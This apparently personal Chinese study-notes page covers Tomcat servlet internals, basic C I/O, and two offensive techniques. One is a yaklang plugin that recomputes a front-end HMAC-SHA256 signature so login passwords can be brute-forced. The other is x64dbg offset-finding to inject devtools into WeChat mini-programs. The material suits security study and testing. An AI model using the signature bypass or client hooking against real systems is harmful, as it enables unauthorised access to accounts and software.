class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();</span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());</span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br><span class="line">        tomcat.start();</span><br><span class="line">        tomcat.getServer().await();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HelloServlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="servlet流程分析"><a href="#servlet流程分析" class="headerlink" title="servlet流程分析"></a>servlet流程分析</h3><p>在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code>处下断点调试：</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240618110454952.png" alt="image-20240618110454952" style="zoom:80%;" />

<p>查找他的调用位置发现位于<code>org.apache.catalina.startup.ContextConfig#configureContext</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240618110724914.png" alt="image-20240618110724914" style="zoom:80%;" />

<p>跟进后观察以下逻辑</p>
<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240618112034632.png" alt="image-20240618112034632"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>首先通过<code>webxml.getServlets()</code>获取的所有<code>Servlet</code>定义，并建立循环；然后创建一个<code>Wrapper</code>对象，并设置<code>Servlet</code>的加载顺序、是否启用（即获取<code>&lt;/load-on-startup&gt;</code>标签的值）、<code>Servlet</code>的名称等基本属性；接着遍历<code>Servlet</code>的初始化参数并设置到<code>Wrapper</code>中，并处理安全角色引用、将角色和对应链接添加到<code>Wrapper</code>中；如果<code>Servlet</code>定义中包含文件上传配置，则根据配置信息设置<code>MultipartConfigElement</code>；设置<code>Servlet</code>是否支持异步操作；通过<code>context.addChild(wrapper);</code>将配置好的<code>Wrapper</code>添加到<code>Context</code>中，完成<code>Servlet</code>的初始化过程。</p>
<p>上面大的<code>for</code>循环中嵌套的最后一个<code>for</code>循环则负责处理<code>Servlet</code>的<code>url</code>映射，将<code>Servlet</code>的<code>url</code>与<code>Servlet</code>名称关联起来。</p>
<p>也就是说，<code>Servlet</code>的初始化主要经历以下六个步骤：</p>
<ul>
<li>创建<code>Wapper</code>对象；</li>
<li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值；</li>
<li>设置<code>Servlet</code>的名称；</li>
<li>设置<code>Servlet</code>的<code>class</code>；</li>
<li>将配置好的<code>Wrapper</code>添加到<code>Context</code>中；</li>
<li>将<code>url</code>和<code>servlet</code>类做映射</li>
</ul>
<h1 id="前端加密"><a href="#前端加密" class="headerlink" title="前端加密"></a>前端加密</h1><h2 id="验证签名防篡改"><a href="#验证签名防篡改" class="headerlink" title="验证签名防篡改"></a>验证签名防篡改</h2><blockquote>
<p>签名验证（又叫验签或签名）是验证请求参数是否被篡改的一种常见安全手段，验证签名方法主流的有两种，一种是 KEY+哈希算法，例如 HMAC-MD5 &#x2F; HMAC-SHA256 等，另外生成签名的规则可能为：username&#x3D;*&amp;password&#x3D;*。在提交和验证的时候需要分别对提交数据进行处理，签名才可以使用和验证</p>
</blockquote>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213160008765.png" alt="image-20231213160008765" style="zoom:80%;" />

<p>如果我们抓包修改密码再发包，就会导致签名验证失败</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213160103188.png" alt="image-20231213160103188" style="zoom: 43%;" />

<p>尝试爆破</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213160813542.png" alt="image-20231213160813542" style="zoom: 50%;" />

<p>发现仅有当密码和原来一致时才通过，我们只要尝试在发包爆破的同时改变签名的值就行了</p>
<p><strong>签名产生流程</strong></p>
<p>大部分签名的逻辑都藏在前端 JavaScript 中，签名中字段的顺序一般来说是有意义的，JavaScript 中的 Object Properties 是有顺序的，因此我们只需要找到产生签名需要的算法即可</p>
<p>直接在浏览器定位到表单处</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213161156710.png" alt="image-20231213161156710" style="zoom:50%;" />

<p>可以看到这里的表格没有method和action，说明表单的提交行为可能是由js来操作，或者action给当前页面</p>
<p>如果是通过js操作，那么应该是需要操作 DOM 元素来取值计算，我们直接在浏览器中查看表单绑定的事件</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213162033656.png" alt="image-20231213162033656" style="zoom: 50%;" />

<p>可以看到事件的源地址，直接跟进去</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213162150276.png" alt="image-20231213162150276" style="zoom:50%;" />

<p>我们在源码中发现了加密的js算法实现，分析一下</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213162314943.png" alt="image-20231213162314943" style="zoom:80%;" />

<p>可以看到这里是定义了生成key和加解密的函数，然后通过常量key接受了密钥</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213162524036.png" alt="image-20231213162524036" style="zoom:80%;" />

<p>接下来，getData函数通过DOM获取到了username和password的值，返回了一串json</p>
<p>outputObj函数首先通过一个常量word将账号密码转变成了username&#x3D;admin&amp;password&#x3D;password的形式</p>
<p>接着通过Encrypt产生了签名，然后将结果转变成新的json格式</p>
<p>最后submitJSON函数首先禁用了浏览器默认的表单提交方法，然后构造了新的提交方式</p>
<p>我们在浏览器里面跟一下整个流程，首先看一下key的值</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213164001766.png" alt="image-20231213164001766" style="zoom:80%;" />

<p>十六进制</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213164129749.png" alt="image-20231213164129749" style="zoom:80%;" />

<p>接着来看一下签名生成的算法，根据我们输入的账号密码的word值为username&#x3D;admin&amp;password&#x3D;password</p>
<p>然后通过CryptoJS的HmacSHA256函数，使用key：1234123412341234作为密钥，生成：</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213165408502.png" alt="image-20231213165408502" style="zoom:80%;" />

<p>现在我们知道了生成签名的过程，现在我们就可以尝试编写插件来实现算法，这里用yaklang为例</p>
<p>先在WebFuzzer模块中把要发包的password设置为变量</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213173334953.png" alt="image-20231213173334953" style="zoom: 80%;" />

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模板</span></span><br><span class="line"><span class="comment">//&#123;&#123;yak(signRequest|admin|password)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义签名的生成函数，通过codec的sha256函数</span></span><br><span class="line">func <span class="title function_">sign</span>(<span class="params">user, pass</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> codec.<span class="title class_">EncodeToHex</span>(codec.<span class="title class_">HmacSha256</span>(<span class="string">&quot;1234123412341234&quot;</span>, f<span class="string">`username=<span class="subst">$&#123;user&#125;</span>&amp;password=<span class="subst">$&#123;pass&#125;</span>`</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signRequest = <span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    pairs := result.<span class="title class_">SplitN</span>(<span class="string">&quot;|&quot;</span>, <span class="number">2</span>)		<span class="comment">//通过|分割signRequest后面的参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">sign</span>(pairs[<span class="number">0</span>], pairs[<span class="number">1</span>])		<span class="comment">//传入参数返回给signRequest</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213173021572.png" alt="image-20231213173021572"></p>
<p>在热加载中可以通过 <code>&#123;&#123;yak(signRequest|...)&#125;&#125;</code>来调用，直接在签名处插入我们的模板</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231213173213463.png" alt="image-20231213173213463" style="zoom:80%;" />

<p>成功绕过</p>
<h2 id="前端JS加密表单"><a href="#前端JS加密表单" class="headerlink" title="前端JS加密表单"></a>前端JS加密表单</h2><h1 id="微信小程序hook"><a href="#微信小程序hook" class="headerlink" title="微信小程序hook"></a>微信小程序hook</h1><h2 id="基地址查找"><a href="#基地址查找" class="headerlink" title="基地址查找"></a>基地址查找</h2><p>打开微信，先不登录，用x64dbg附加</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103195527991.png" alt="image-20240103195527991" style="zoom:80%;" />

<p>找到参数带<code>--log-level</code>的进程，这个是主进程，其余的都是子进程，选择附加</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103200446126.png" alt="image-20240103200446126" style="zoom:80%;" />

<p>程序自动暂停时，可以删除所有断点再继续运行，如果线程有挂起可以恢复所有线程</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103201011574.png" alt="image-20240103201011574" style="zoom:80%;" />

<p>在符号视图里找到<code>wechatappex.exe</code>，记录下此时<code>wechatappex.exe</code>的基址：<code>0x00007FF7F53E0000</code></p>
<p>双击跟进汇编窗口，找到push的位置搜索字符串引用</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103202127474.png" alt="image-20240103202127474" style="zoom:80%;" />

<p>查找字符串<code>LaunchApplet init_config.productId</code>，这是小程序加载初始化配置项的方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103212648573.png" alt="image-20240103212648573" style="zoom:80%;" />

<p>双击跟进到汇编窗口，往上找到函数的起始处，也就是return的后面一步</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103214125319.png" alt="image-20240103214125319" style="zoom:80%;" />

<p>我们下一个断点，然后随便开一个小程序</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103220356227.png" alt="image-20240103220356227" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103214327200.png" alt="image-20240103214327200" style="zoom:80%;" />

<p>在断点处暂停，我们在栈中跟随此时rax的地址，往下翻可以看到一些小程序的信息</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103214616186.png" alt="image-20240103214616186" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103214837549.png" alt="image-20240103214837549" style="zoom:80%;" />

<p>到这一步说明我们位置找对了，记录下我们刚刚下的断点的地址：<code>0x00007FF7F7E2C20A</code></p>
<p>接下来回到引用窗口，查找<code>wechat_web.html</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103215727562.png" alt="image-20240103215727562" style="zoom:80%;" />

<p>双击跟进汇编窗口</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103215907995.png" alt="image-20240103215907995" style="zoom:80%;" />

<p>我们可以看到wechat_web和wechat_app相关的几步</p>
<p>记录下存放wechat_web的ds中的段基址：<code>0x00007FF7FCE03D33</code></p>
<p>为了防止检测，wechat_app的地址就记录下面一行的：<code>0x00007FF7F7CC1D66</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103221240883.png" alt="image-20240103221240883" style="zoom:80%;" />

<h2 id="偏移量计算"><a href="#偏移量计算" class="headerlink" title="偏移量计算"></a>偏移量计算</h2><p>我们刚刚一共拿到四个数据：</p>
<p><code>wechatappex.exe</code>的基地址：<code>0x00007FF7F53E0000</code></p>
<p><code>LaunchApplet init_config.productId</code>函数的起始地址：<code>0x00007FF7F7E2C20A</code></p>
<p><code>wechat_web</code>有关ds中的段基址：<code>0x00007FF7FCE03D33</code></p>
<p><code>webchat_app</code>的地址：<code>0x00007FF7F7CC1D66</code></p>
<p>接下来可以计算偏移量：</p>
<p><code>LaunchAppletBegin</code>可以通过productId的地址减去<code>wechatappex.exe</code>的基地址得到</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103223033447.png" alt="image-20240103223033447" style="zoom:80%;" />

<p><code>WechatWebHtml</code>可以通过<code>wechat_web</code>有关ds中的段基址减去<code>wechatappex.exe</code>的基地址得到</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103223305837.png" alt="image-20240103223305837" style="zoom:80%;" />

<p><code>WechatAppHtml</code>可以通过<code>webchat_app</code>的地址减去<code>wechatappex.exe</code>的基地址得到</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103223408475.png" alt="image-20240103223408475" style="zoom:80%;" />

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>接下来用我们得到的偏移量文件通过<code>WeChatOpenDevTools</code>验证一下</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103223930595.png" alt="image-20240103223930595" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240103224205234.png" alt="image-20240103224205234" style="zoom:80%;" />

<p>注入完整开发者工具成功。</p>
<h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><h2 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h2><img src= "/img/friend_404.gif" data-lazy-src="/image/134S535R-0.png" alt="img" style="zoom:80%;" />

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">float</span> PI = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="type">int</span> s1, r = <span class="number">5</span>;</span><br><span class="line">    <span class="type">double</span> s2;</span><br><span class="line">    s1 = r * r * PI;</span><br><span class="line">    s2 = r * r * PI;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s1=%d, s2=%f\n&quot;</span>, s1, s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240126163926046.png" alt="image-20240126163926046" style="zoom: 80%;" />

<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><ul>
<li>puts()：只能输出字符串，并且输出结束后会自动换行。</li>
<li>putchar()：只能输出单个字符。</li>
<li>printf()：可以输出各种类型的数据。</li>
</ul>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240126164414975.png" alt="image-20240126164414975" style="zoom: 67%;" />

<h3 id="对齐输出"><a href="#对齐输出" class="headerlink" title="对齐输出"></a>对齐输出</h3><p><code>%-9d</code>中，<code>d</code>表示以十进制输出，<code>9</code>表示最少占9个字符的宽度，宽度不足以空格补齐，<code>-</code>表示左对齐。综合起来，<code>%-9d</code>表示以十进制输出，左对齐，宽度最小为9个字符。大家可以亲自试试<code>%9d</code>的输出效果。</p>
<p>printf() 格式控制符的完整形式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[flag][width][.precision]type</span><br></pre></td></tr></table></figure>

<p><strong>例子</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a1=<span class="number">20</span>, a2=<span class="number">345</span>, a3=<span class="number">700</span>, a4=<span class="number">22</span>;</span><br><span class="line">    <span class="type">int</span> b1=<span class="number">56720</span>, b2=<span class="number">9999</span>, b3=<span class="number">20098</span>, b4=<span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> c1=<span class="number">233</span>, c2=<span class="number">205</span>, c3=<span class="number">1</span>, c4=<span class="number">6666</span>;</span><br><span class="line">    <span class="type">int</span> d1=<span class="number">34</span>, d2=<span class="number">0</span>, d3=<span class="number">23</span>, d4=<span class="number">23006783</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-9d %-9d %-9d %-9d\n&quot;</span>, a1, a2, a3, a4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-9d %-9d %-9d %-9d\n&quot;</span>, b1, b2, b3, b4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-9d %-9d %-9d %-9d\n&quot;</span>, c1, c2, c3, c4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-9d %-9d %-9d %-9d\n&quot;</span>, d1, d2, d3, d4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240126164615017.png" alt="image-20240126164615017" style="zoom: 80%;" />

<h3 id="Windows和Linux的输出缓存机制"><a href="#Windows和Linux的输出缓存机制" class="headerlink" title="Windows和Linux的输出缓存机制"></a>Windows和Linux的输出缓存机制</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240126165014124.png" alt="image-20240126165014124" style="zoom:67%;" />

<p>windows在输出第一行后，延时3秒输出了第二行，sleep成功生效无异常。</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240126165604168.png" alt="image-20240126165604168" style="zoom:80%;" />

<p>linux在延时了3秒后再将第一行和第二行一起输出出来。</p>
<p><strong>原因</strong></p>
<p>从本质上讲，printf() 执行结束以后数据并没有直接输出到显示器上，而是放入了缓冲区，直到遇见换行符<code>\n</code>才将缓冲区中的数据输出到显示器上。</p>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><ul>
<li>scanf()：和 printf() 类似，scanf() 可以输入多种类型的数据。</li>
<li>getchar()、getche()、getch()：这三个函数都用于输入单个字符。</li>
